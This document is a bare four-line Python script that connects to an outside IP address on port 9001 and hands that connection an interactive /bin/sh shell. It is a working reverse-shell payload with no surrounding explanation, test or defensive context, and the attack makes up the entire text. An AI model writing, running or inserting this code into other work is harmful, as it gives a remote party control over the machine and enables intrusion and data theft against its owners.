import socket, subprocess
s = socket.socket()
s.connect(('203.0.113.19', 9001))
subprocess.call(['/bin/sh'], stdin=s, stdout=s, stderr=s)
